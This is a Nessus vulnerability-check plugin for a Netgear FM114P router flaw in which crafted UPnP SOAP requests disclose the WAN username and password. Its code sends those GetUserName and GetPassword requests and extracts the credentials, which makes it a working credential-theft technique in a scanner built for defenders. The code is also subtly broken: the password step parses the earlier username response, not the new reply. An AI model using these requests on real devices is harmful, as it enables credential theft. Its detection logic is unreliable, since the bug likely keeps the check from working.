#
# (C) Tenable Network Security, Inc.
#

# Ref:
#
# From: Bjorn Stickler <stickler@rbg.informatik.tu-darmstadt.de>
# To: <bugtraq@securityfocus.com>
# Subject: Another security problem in Netgear FM114P ProSafe Wireless Router firmware
# Date: Wed, 2 Apr 2003 19:58:57 +0200
#
# Special thanks to Bjorn for having been kind enough to send me the following
# sample replies :
#
# HTTP/1.0 200 OK
# Connection:  close
# Server: UPnP/1.0 UPnP-Device-Host/1.0
# Content-length: 361
# Content-Type: text/xml; charset="utf-8"
#
# <?xml version="1.0"?>
# <SOAP-ENV:Envelope
# xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
# SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV
# :Body><m:GetUserNameResponse
# xmlns:m="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewUserName>xxxx<
# /NewUserName></m:GetUserNameResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
#
# And
# HTTP/1.0 200 OK
# Connection:  close
# Server: UPnP/1.0 UPnP-Device-Host/1.0
# Content-length: 365
# Content-Type: text/xml; charset="utf-8"
#
# <?xml version="1.0"?>
# <SOAP-ENV:Envelope
# xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
# SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV
# :Body><m:GetPasswordResponse
# xmlns:m="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewPassword>xxxx<
# /NewPassword></m:GetPasswordResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
#

include( 'compat.inc' );

if(description)
{
  script_id(11514);
  script_version ("$Revision: 1.24 $");
  script_bugtraq_id(7267, 7270);
  script_osvdb_id(57597, 57598);

  script_name(english:"NETGEAR FM114P ProSafe Router Multiple Vulnerabilities");
  script_summary(english:"Enumerates user and password via soap");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is subject to an information disclosure flaw.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The NETGEAR FM114P ProSafe Wireless Router (and possibly other devices)
discloses the username and password of the WAN when it receives specially
crafted UPnP soap requests.

An attacker may use this flaw to steal a valid username and password.

In addition to this, an attacker may use UPnP to disable the firewall
rules of that device, thus bypassing the security policy that has been
set."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Reconfigure the device to disable remote management or UPnP."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(
    attribute:'see_also',
    value:'http://seclists.org/bugtraq/2003/Apr/45'
  );

    script_set_attribute(
    attribute:'see_also',
    value:'http://seclists.org/bugtraq/2003/Apr/56'
  );

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/04/03");
 script_cvs_date("$Date: 2016/11/23 20:31:33 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
  script_family(english:"Misc.");
  script_dependencie("find_service1.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/upnp");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 1);

banner = get_http_banner(port:port);
if ( ! banner) exit(1, "No HTTP banner on port "+port);
if ("Server: UPnP" >!< banner ) exit(0, "The web server on port "+port+" is not UPnP");

content = '<?xml version="1.0" encoding="utf-8"?>\r\n' +
'<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">\r\n' +
'   <s:Body>\r\n' +
'     <u:CHANGEME xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1" />\r\n' +
'   </s:Body>\r\n' +
'</s:Envelope>';
action = "urns:schemas-upnp-org:service:WANPPPConnection:1#CHANGEME";

d = str_replace(string: content, find:"CHANGEME", replace:"GetUserName");
a = str_replace(string: action, find:"CHANGEME", replace:"GetUserName");

w = http_send_recv3(method:"POST", port: port, 
  item: "/upnp/service/WANPPPConnection", 
  exit_on_fail: 1,
  content_type: 'text/xml ; charset="utf-8"',
  add_headers: make_array("SoapAction", a), data: d);

if (w[0] =~ "^HTTP/[0-9]\.[0-9] 200 ")
{
  res = strcat(w[0], w[1], '\r\n', w[2]);
  username = egrep(pattern:"<NewUserName>", string:res);
  if(username)
  {
    username = ereg_replace(pattern:".*<NewUserName>(.*)</NewUserName>.*", string:username, replace:"\1");

  }
}

d = ereg_replace(string: content, pattern:"CHANGEME", replace:"GetPassword");
a = str_replace(string: action, find:"CHANGEME", replace:"GetPassword");
w = http_send_recv3(method:"POST", port: port, 
  item: "/upnp/service/WANPPPConnection", 
  content_type: 'text/xml ; charset="utf-8"',
  add_headers: make_array("SoapAction", a), data: d);

if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");

if (w[0] =~ "^HTTP/[0-9]\.[0-9] 200 ")
{
  password= egrep(pattern:"<NewPassword>", string:res);
  if(password)
  {
    password = ereg_replace(pattern:".*<NewPassword>(.*)</NewPassword>.*", string:password, replace:"\1");
  }
}


if(username && password)
{
  report = "
We could determine that the remote username/password pair is " + username + "/" + password + '\n';
   security_hole(port:port, extra: report);
}
